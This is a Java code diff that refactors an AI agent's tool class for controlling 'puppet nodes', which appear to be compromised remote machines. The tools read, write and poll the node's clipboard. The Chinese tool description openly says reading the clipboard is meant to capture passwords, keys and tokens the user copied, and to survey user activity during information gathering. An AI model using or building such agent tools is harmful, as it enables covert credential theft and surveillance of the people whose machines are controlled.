@@ -2,7 +2,7 @@ package org.leo.ai.tools.puppetnode;
 
 import org.leo.ai.agent.AiToolContext;
 import org.leo.ai.util.PuppetNodeSessionUtils;
-import org.leo.core.puppet.impl.JavaPuppetNode;
+import org.leo.core.puppet.capability.ClipboardCapable;
 import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
 import dev.langchain4j.agent.tool.Tool;
@@ -26,7 +26,7 @@ public class ClipboardTools {
             + "适合获取用户复制的敏感信息（密码、密钥、令牌），或在信息收集阶段了解用户活动。")
     public Map<String, Object> readClipboard() throws Exception {
         String sessionId = AiToolContext.requireSessionId();
-        JavaPuppetNode node = PuppetNodeSessionUtils.getJavaPuppetNode(sessionId);
+        ClipboardCapable node = PuppetNodeSessionUtils.requireCapability(sessionId, ClipboardCapable.class);
         return node.readClipboard();
     }
 
@@ -35,7 +35,7 @@ public class ClipboardTools {
     public Map<String, Object> writeClipboard(
             @P("要写入剪贴板的文本内容") String content) throws Exception {
         String sessionId = AiToolContext.requireSessionId();
-        JavaPuppetNode node = PuppetNodeSessionUtils.getJavaPuppetNode(sessionId);
+        ClipboardCapable node = PuppetNodeSessionUtils.requireCapability(sessionId, ClipboardCapable.class);
         return node.writeClipboard(content);
     }
 
@@ -46,7 +46,7 @@ public class ClipboardTools {
             @P("监控时长(秒)，默认 10，上限 60") int duration,
             @P("轮询间隔(秒)，默认 1") int interval) throws Exception {
         String sessionId = AiToolContext.requireSessionId();
-        JavaPuppetNode node = PuppetNodeSessionUtils.getJavaPuppetNode(sessionId);
+        ClipboardCapable node = PuppetNodeSessionUtils.requireCapability(sessionId, ClipboardCapable.class);
         if (duration <= 0) duration = 10;
         if (interval <= 0) interval = 1;
         return node.monitorClipboard(duration, interval);
